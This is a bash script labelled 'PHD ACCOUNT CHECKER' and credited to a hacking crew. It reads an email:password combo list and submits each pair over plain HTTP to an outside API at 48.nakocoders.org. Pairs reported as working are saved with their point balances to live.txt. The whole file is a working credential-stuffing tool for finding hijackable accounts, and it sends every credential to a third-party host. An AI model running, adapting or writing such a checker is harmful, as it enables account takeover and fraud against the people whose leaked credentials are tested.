#!/bin/bash
#issued on : 17 agustus 2018
#coded By Arvan Apriyana
waktu=$(date '+%Y-%m-%d %H:%M:%S')
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
LIGHTGREEN="\e[92m"
MARGENTA="\e[35m"
BLUE="\e[34m"
BOLD="\e[1m"
NOCOLOR="\e[0m"
header(){
printf "${GREEN}
         ####################################
         ####################################
         #######                      #######
         #######                      #######
         #######                      #######
         ###############      ###############
         ###############      ###############
         ###############      ###############
         ###############      ###############${RED}
         #######    ####      ####    #######
         #######    ####      ####    #######
         #######    ##############    #######
         #######    ##############    #######
         #######                      #######
         ####################################
         ####################################s${NOCOLOR}
         ------------------------------------
                 PHD ACCOUNT CHECKER
               Code By: Arvan Apriyana
                 www.tatsumi-crew.net
         ------------------------------------
"
}
tatsumi(){
    ua=$(cat ua.txt | sort -R | head -1)
    curlnya=$(curl -s "http://48.nakocoders.org/api/phd/api.php?emailna=$1&passwordna=$2" -L)
    livena=$(echo $curlnya | grep -Po '(?<="msg":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
    kontenID=$(echo $curlnya | grep -Po '(?<=Point : )[^<span]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
    if [[ ! $livena =~ "DIE" ]]; then
        printf "${GREEN}[LIVE] $1|$2 [Point:$kontenID] [$waktu]\n";
        echo "[LIVE] $1|$2 [Point:$kontenID] [$waktu]" >> live.txt
        printf "${NORMAL}"
    else
        printf "${RED}[DIE] $1|$2 [$waktu]\n";
        printf "${NORMAL}"
    fi
}
header
echo ""
echo "List In This Directory : "
ls
echo "Delimeter list -> email:password"
echo -n "Masukan File List : "
read list
if [ ! -f $list ]; then
    echo "$list No Such File"
exit
fi
    x=$(gawk -F: '{ print $1 }' $list)
    y=$(gawk -F: '{ print $2 }' $list)
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emailgblg=($x)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwordna=($y)'
for (( i = 0; i < "${#emailgblg[@]}"; i++ )); do
    emailna="${emailgblg[$i]}"
    kontol="${passwordna[$i]}"
        tatsumi $emailna $kontol
done
